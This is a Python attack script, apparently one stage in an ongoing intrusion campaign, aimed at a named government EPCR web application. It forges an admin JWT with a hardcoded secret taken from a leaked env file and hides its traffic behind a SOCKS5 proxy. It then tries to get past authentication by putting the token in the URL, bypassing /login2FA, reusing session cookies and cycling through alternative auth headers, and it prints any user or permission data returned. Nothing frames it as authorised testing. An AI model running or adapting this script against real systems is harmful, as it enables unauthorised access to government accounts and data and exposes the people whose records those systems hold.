#!/usr/bin/env python3
"""Phase 63: Exploit EPCR login2FA bypass + token-in-URL path."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64, hmac, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5://202.160.76.154:11085', 'http': 'socks5://202.160.76.154:11085'}
JWT_SECRET = "ru/3xu4dkru4888"  # From env file (TOCP secret, not EPCR's)

# Forge JWT with different payloads
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def forge_jwt(payload_dict, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    h = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = base64url_encode(json.dumps(payload_dict, separators=(',', ':')).encode())
    msg = f"{h}.{p}"
    sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
    return msg + "." + base64url_encode(sig)

now = int(time.time())
# Try with permissions
admin_jwt = forge_jwt({"sub": "1", "role": "ADMIN", "user": {"role": "ADMIN"}, "permissions": ["AUTH_ROLE", "AUTH_USER", "AUTH_PERM", "*"], "iat": now, "exp": now + 3600}, JWT_SECRET)

EPCR = "https://epcr.tpf.gov.tw:4004"

print("=== Approach 1: Token in URL (?token=) ===")
# The app reads token from URL search param and stores it in localStorage
# The server might accept ?token= from the URL
r = requests.get(f'{EPCR}/Users?token={admin_jwt}', proxies=PROXY, verify=False, timeout=10,
                  headers={'User-Agent': 'Mozilla/5.0'})
print(f"  GET /Users?token=JWT: {r.status_code}, len={len(r.text)}")
if r.status_code == 200:
    print(f"    *** SUCCESS: {r.text[:500]}")

r = requests.get(f'{EPCR}/permission?token={admin_jwt}', proxies=PROXY, verify=False, timeout=10,
                  headers={'User-Agent': 'Mozilla/5.0'})
print(f"  GET /permission?token=JWT: {r.status_code}, len={len(r.text)}")
if r.status_code == 200:
    print(f"    *** SUCCESS: {r.text[:500]}")

print("\n=== Approach 2: login2FA bypass ===")
# POST /login2FA with just userToken (no main login needed)
r = requests.post(f'{EPCR}/login2FA', proxies=PROXY, verify=False, timeout=10,
                   headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
                   json={'userToken': 'test', 'domain': 'AUTH_SERVER'})
print(f"  POST /login2FA (userToken=test): {r.status_code}, len={len(r.text)}")
print(f"    Body: {r.text[:300]}")

# Try with forged JWT as userToken
r = requests.post(f'{EPCR}/login2FA', proxies=PROXY, verify=False, timeout=10,
                   headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
                   json={'userToken': admin_jwt, 'domain': 'AUTH_SERVER'})
print(f"  POST /login2FA (userToken=JWT): {r.status_code}, len={len(r.text)}")
print(f"    Body: {r.text[:300]}")

# Try without domain
r = requests.post(f'{EPCR}/login2FA', proxies=PROXY, verify=False, timeout=10,
                   headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
                   json={'userToken': admin_jwt})
print(f"  POST /login2FA (userToken=JWT, no domain): {r.status_code}, len={len(r.text)}")
print(f"    Body: {r.text[:300]}")

print("\n=== Approach 3: Login with token bypass ===")
# The LoginCtrl reads token from URL and stores in localStorage
# Try accessing login page with token param and then accessing protected routes
# with cookies from that session
headers_session = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
}
r = requests.get(f'{EPCR}/login', proxies=PROXY, verify=False, timeout=10,
                  headers=headers_session, params={'token': admin_jwt})
print(f"  GET /login?token=JWT: {r.status_code}")
print(f"    Cookies: {dict(r.cookies)}")

# Now use those cookies + token
all_cookies = dict(r.cookies)
if 'JSESSIONID' in all_cookies:
    r = requests.get(f'{EPCR}/Users', proxies=PROXY, verify=False, timeout=10,
                      headers={'Authorization': f'Bearer {admin_jwt}',
                               'User-Agent': 'Mozilla/5.0',
                               'Accept': 'application/json'},
                      cookies=r.cookies)
    print(f"  GET /Users (with session+cookie): {r.status_code}, len={len(r.text)}")
    if r.status_code == 200:
        print(f"    *** SUCCESS: {r.text[:500]}")

# Try: the server might check for Authorization header in a different format
print("\n=== Approach 4: Alternative auth headers ===")
for header_name in ['Authorization', 'X-JWT-Token', 'X-Auth-JWT', 'auth', 'jwt', 'access_token', 'token']:
    r = requests.get(f'{EPCR}/Users', proxies=PROXY, verify=False, timeout=10,
                      headers={'User-Agent': 'Mozilla/5.0', header_name: admin_jwt})
    if r.status_code not in [401, 404]:
        print(f"  {header_name}: {r.status_code}, len={len(r.text)}")
        if r.status_code == 200:
            print(f"    *** SUCCESS: {r.text[:500]}")
